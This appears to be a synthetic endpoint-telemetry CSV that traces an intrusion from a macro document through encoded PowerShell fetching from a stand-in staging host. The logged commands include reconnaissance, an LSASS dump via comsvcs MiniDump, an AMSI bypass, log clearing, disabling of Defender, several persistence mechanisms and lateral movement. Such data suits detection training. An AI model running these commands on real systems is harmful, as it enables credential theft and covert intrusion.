Timestamp,DeviceName,ActionType,FileName,FolderPath,ProcessCommandLine,SHA256,AccountName,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,ProcessId,RemoteIP,RemoteUrl,RemotePort,ReportId
2026-05-20T08:30:15Z,WS-MARKETING-08,ProcessCreated,svchost.exe,C:\Windows\System32,svchost.exe -k netsvcs,A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,SYSTEM,services.exe,C:\Windows\System32\services.exe,612,SYSTEM,4007,,,,1001
2026-05-20T08:33:15Z,WS-MARKETING-08,ProcessCreated,explorer.exe,C:\Windows,explorer.exe,B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1,jbecker,userinit.exe,C:\Windows\System32\userinit.exe,894,jbecker,4014,,,,1002
2026-05-20T08:37:15Z,WS-FINANCE-04,ProcessCreated,explorer.exe,C:\Windows,explorer.exe,B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1,jdoe,userinit.exe,C:\Windows\System32\userinit.exe,901,jdoe,4021,,,,1003
2026-05-20T08:38:15Z,SRV-FILES-01,ProcessCreated,svchost.exe,C:\Windows\System32,svchost.exe -k LocalServiceNetworkRestricted,A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,SYSTEM,services.exe,C:\Windows\System32\services.exe,612,SYSTEM,4028,,,,1004
2026-05-20T08:40:15Z,WS-MARKETING-08,ProcessCreated,OUTLOOK.EXE,C:\Program Files\Microsoft Office\root\Office16,OUTLOOK.EXE /recycle,0011223344550011223344550011223344550011223344550011223344550011,jbecker,explorer.exe,C:\Windows\explorer.exe,3412,jbecker,4035,,,,1005
2026-05-20T09:05:15Z,WS-MARKETING-08,ProcessCreated,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,"WINWORD.EXE /n ""C:\Users\jbecker\Downloads\Q2_Marketing_Plan.docm""",B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8,jbecker,OUTLOOK.EXE,OUTLOOK.EXE /recycle,4035,jbecker,4042,,,,1006
2026-05-20T09:05:57Z,WS-MARKETING-08,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,WINWORD.EXE,"WINWORD.EXE /n ""C:\Users\jbecker\Downloads\Q2_Marketing_Plan.docm""",4042,jbecker,4049,,,,1007
2026-05-20T09:06:09Z,WS-MARKETING-08,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,198.51.100.42,evil-staging.example,443,1008
2026-05-20T09:06:27Z,WS-MARKETING-08,FileCreated,s2.ps1,C:\Users\jbecker\AppData\Local\Temp,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,,,,1009
2026-05-20T09:06:35Z,WS-MARKETING-08,ProcessCreated,cmd.exe,C:\Windows\System32,cmd.exe /c whoami /all,E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4056,,,,1010
2026-05-20T09:06:43Z,WS-MARKETING-08,ProcessCreated,whoami.exe,C:\Windows\System32,whoami.exe /all,11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4063,,,,1011
2026-05-20T09:06:51Z,WS-MARKETING-08,ProcessCreated,whoami.exe,C:\Windows\System32,whoami.exe /priv,11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4070,,,,1012
2026-05-20T09:06:59Z,WS-MARKETING-08,ProcessCreated,whoami.exe,C:\Windows\System32,whoami.exe /groups,11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4077,,,,1013
2026-05-20T09:07:07Z,WS-MARKETING-08,ProcessCreated,hostname.exe,C:\Windows\System32,hostname.exe,55CC66DD77EE55CC66DD77EE55CC66DD77EE55CC66DD77EE55CC66DD77EE55CC,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4084,,,,1014
2026-05-20T09:07:15Z,WS-MARKETING-08,ProcessCreated,ipconfig.exe,C:\Windows\System32,ipconfig.exe /all,33CC44DD55EE33CC44DD55EE33CC44DD55EE33CC44DD55EE33CC44DD55EE33CC,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4091,,,,1015
2026-05-20T09:07:23Z,WS-MARKETING-08,ProcessCreated,nltest.exe,C:\Windows\System32,nltest.exe /domain_trusts,F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4098,,,,1016
2026-05-20T09:07:31Z,WS-MARKETING-08,ProcessCreated,nltest.exe,C:\Windows\System32,nltest.exe /dclist:corp.local,F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4105,,,,1017
2026-05-20T09:07:39Z,WS-MARKETING-08,ProcessCreated,net.exe,C:\Windows\System32,net.exe user /domain,A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4112,,,,1018
2026-05-20T09:07:47Z,WS-MARKETING-08,ProcessCreated,net.exe,C:\Windows\System32,"net.exe group ""Domain Admins"" /domain",A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4119,,,,1019
2026-05-20T09:07:55Z,WS-MARKETING-08,ProcessCreated,net.exe,C:\Windows\System32,"net.exe group ""Enterprise Admins"" /domain",A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4126,,,,1020
2026-05-20T09:08:03Z,WS-MARKETING-08,ProcessCreated,net.exe,C:\Windows\System32,net.exe view /domain,A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4133,,,,1021
2026-05-20T09:08:11Z,WS-MARKETING-08,ProcessCreated,systeminfo.exe,C:\Windows\System32,systeminfo.exe,22BB33CC44DD22BB33CC44DD22BB33CC44DD22BB33CC44DD22BB33CC44DD22BB,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4140,,,,1022
2026-05-20T09:08:19Z,WS-MARKETING-08,ProcessCreated,arp.exe,C:\Windows\System32,arp.exe -a,22FF33AA44BB22FF33AA44BB22FF33AA44BB22FF33AA44BB22FF33AA44BB22FF,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4147,,,,1023
2026-05-20T09:08:27Z,WS-MARKETING-08,ProcessCreated,route.exe,C:\Windows\System32,route.exe print,33AA44BB55CC33AA44BB55CC33AA44BB55CC33AA44BB55CC33AA44BB55CC33AA,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4154,,,,1024
2026-05-20T09:08:47Z,WS-MARKETING-08,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,198.51.100.42,evil-staging.example,443,1025
2026-05-20T09:10:47Z,WS-MARKETING-08,ProcessCreated,rundll32.exe,C:\Windows\System32,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jbecker\AppData\Local\Temp\out.bin full,B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4161,,,,1026
2026-05-20T09:10:55Z,WS-MARKETING-08,FileCreated,out.bin,C:\Users\jbecker\AppData\Local\Temp,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jbecker\AppData\Local\Temp\out.bin full,C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2,jbecker,rundll32.exe,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jbecker\AppData\Local\Temp\out.bin full,4161,jbecker,4161,,,,1027
2026-05-20T09:11:17Z,WS-MARKETING-08,ProcessCreated,vaultcmd.exe,C:\Windows\System32,"vaultcmd.exe /listcreds:""Windows Credentials"" /all",99CC00DD11EE99CC00DD11EE99CC00DD11EE99CC00DD11EE99CC00DD11EE99CC,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4168,,,,1028
2026-05-20T09:11:35Z,WS-MARKETING-08,ProcessCreated,setspn.exe,C:\Windows\System32,setspn.exe -T corp.local -Q */*,00DD11EE22FF00DD11EE22FF00DD11EE22FF00DD11EE22FF00DD11EE22FF00DD,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4175,,,,1029
2026-05-20T09:11:40Z,WS-MARKETING-08,NetworkConnectionEvents,setspn.exe,C:\Windows\System32,setspn.exe -T corp.local -Q */*,00DD11EE22FF00DD11EE22FF00DD11EE22FF00DD11EE22FF00DD11EE22FF00DD,jbecker,setspn.exe,setspn.exe -T corp.local -Q */*,4175,jbecker,4175,10.99.1.5,dc-corp-01.corp.local,389,1030
2026-05-20T09:11:54Z,WS-MARKETING-08,NetworkConnectionEvents,lsass.exe,C:\Windows\System32,lsass.exe,A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,SYSTEM,lsass.exe,lsass.exe,716,SYSTEM,716,10.99.1.5,dc-corp-01.corp.local,88,1031
2026-05-20T09:12:54Z,WS-MARKETING-08,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,"powershell.exe -enc $Ref=[Ref].Assembly.GetType(""System.Management.Automation.AmsiUtils"");$Ref.GetField(""amsiInitFailed"",""NonPublic,Static"").SetValue($null,$true)",C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4182,,,,1032
2026-05-20T09:13:04Z,WS-MARKETING-08,ProcessCreated,wevtutil.exe,C:\Windows\System32,wevtutil.exe cl Security,77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4189,,,,1033
2026-05-20T09:13:12Z,WS-MARKETING-08,ProcessCreated,reg.exe,C:\Windows\System32,reg.exe add HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f,44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4196,,,,1034
2026-05-20T09:15:12Z,WS-MARKETING-08,ProcessCreated,schtasks.exe,C:\Windows\System32,"schtasks.exe /create /tn ""WindowsUpdateCheck"" /tr ""C:\Users\jbecker\AppData\Local\Temp\s2.ps1"" /sc onlogon /ru SYSTEM /f",D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4203,,,,1035
2026-05-20T09:15:26Z,WS-MARKETING-08,ProcessCreated,reg.exe,C:\Windows\System32,"reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ""MicrosoftEdgeUpdater"" /d ""C:\ProgramData\update.exe /q"" /f",44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4210,,,,1036
2026-05-20T09:15:36Z,WS-MARKETING-08,ProcessCreated,reg.exe,C:\Windows\System32,"reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v ""Bootstrap"" /d ""powershell.exe -f C:\Users\jbecker\AppData\Local\Temp\s2.ps1"" /f",44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD55EE66FF44DD,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4217,,,,1037
2026-05-20T09:15:54Z,WS-MARKETING-08,ProcessCreated,wmic.exe,C:\Windows\System32\wbem,"wmic.exe /namespace:\\root\subscription PATH __EventFilter CREATE Name=""MaintFilter"", EventNameSpace=""root\cimv2"", QueryLanguage=""WQL"", Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""",55EE66FF77AA55EE66FF77AA55EE66FF77AA55EE66FF77AA55EE66FF77AA55EE,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4224,,,,1038
2026-05-20T09:16:16Z,WS-MARKETING-08,ProcessCreated,sc.exe,C:\Windows\System32,"sc.exe create NetSvcMaint binPath= ""C:\ProgramData\update.exe /svc"" start= auto DisplayName= ""Network Service Maintenance""",66FF77AA88BB66FF77AA88BB66FF77AA88BB66FF77AA88BB66FF77AA88BB66FF,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4231,,,,1039
2026-05-20T09:16:46Z,WS-MARKETING-08,FileCreated,update.exe,C:\ProgramData,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,,,,1040
2026-05-20T09:18:46Z,WS-MARKETING-08,ProcessCreated,net.exe,C:\Windows\System32,net.exe use \\SRV-FILES-01\C$ /user:CORP\jbecker,A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4238,,,,1041
2026-05-20T09:18:52Z,WS-MARKETING-08,NetworkConnectionEvents,net.exe,C:\Windows\System32,net.exe use \\SRV-FILES-01\C$ /user:CORP\jbecker,A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,jbecker,net.exe,net.exe use \\SRV-FILES-01\C$ /user:CORP\jbecker,4238,jbecker,4238,10.99.1.10,srv-files-01.corp.local,445,1042
2026-05-20T09:19:04Z,WS-MARKETING-08,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe Invoke-Command -ComputerName SRV-FILES-01 -ScriptBlock {whoami; hostname; ipconfig /all},C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4245,,,,1043
2026-05-20T09:19:08Z,WS-MARKETING-08,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe Invoke-Command -ComputerName SRV-FILES-01,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4245,10.99.1.10,srv-files-01.corp.local,5985,1044
